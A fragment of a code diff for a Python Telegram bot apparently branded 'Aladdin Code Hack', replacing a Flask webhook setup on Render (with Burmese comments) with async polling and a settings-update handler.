+    data_manager.update_user_settings(user_id, "code_len", length)
+    await bot.answer_callback_query(call.id, "Settings updated successfully!")
+    await bot.edit_message_text("⚙️ <b>Config settings saved! Ready to scan.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")
+
+# ---------------------- STARTING THE PLATFORM ----------------------
+async def main():
+    print("[*] Starting Premium Aladdin Code Hack Bot Platform...")
+    await bot.polling(non_stop=True)
+
 if __name__ == "__main__":
-    # Web server မစတင်မီ ရှိပြီးသား Webhook ကို ဖျက်ပြီး အသစ် ပြန်ချိတ်ဆက်ခြင်း
-    bot.remove_webhook()
-    
-    if PUBLIC_URL:
-        # ဥပမာ- https://your-app.onrender.com/YOUR_BOT_TOKEN ဖြင့် Webhook ချိတ်မည်
-        webhook_url = f"{PUBLIC_URL.rstrip('/')}/{BOT_TOKEN}"
-        bot.set_webhook(url=webhook_url)
-        print(f"[+] Webhook set successfully to: {webhook_url}")
-    else:
-        print("[-] Warning: PUBLIC_URL environment variable is missing. Webhook not set!")
-
-    port = int(os.environ.get("PORT", 8080))
-    # Thread မသုံးတော့ဘဲ Flask ကို Main Thread မှာ တိုက်ရိုက် Run စေခြင်း
-    print("[+] Flask Web Server + Webhook Running 24/7 on Render...")
-    app.run(host='0.0.0.0', port=port)
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n[!] Bot Closed Safely.")
+        sys.exit(0)
